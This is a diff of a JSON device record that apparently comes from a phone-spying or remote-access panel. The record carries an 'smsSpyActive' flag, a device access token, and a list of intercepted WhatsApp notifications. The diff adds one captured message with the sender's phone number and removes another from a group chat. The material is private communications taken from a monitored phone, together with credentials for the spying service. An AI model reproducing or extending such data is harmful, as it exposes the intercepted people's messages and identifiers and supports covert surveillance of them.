@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776890017897,
+    "lastSeen": 1776890035897,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-3406-5819",
+        "content": "Oke",
+        "time": "23/04 04:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776890037163
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "22/04 15:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1776843149788
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (24 pesan): ~ Aufatzy",
-        "content": "Ini bnr kaga nihh?🗿",
-        "time": "22/04 15:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776843149739
       }
     ],
     "galleryPhotos": [],
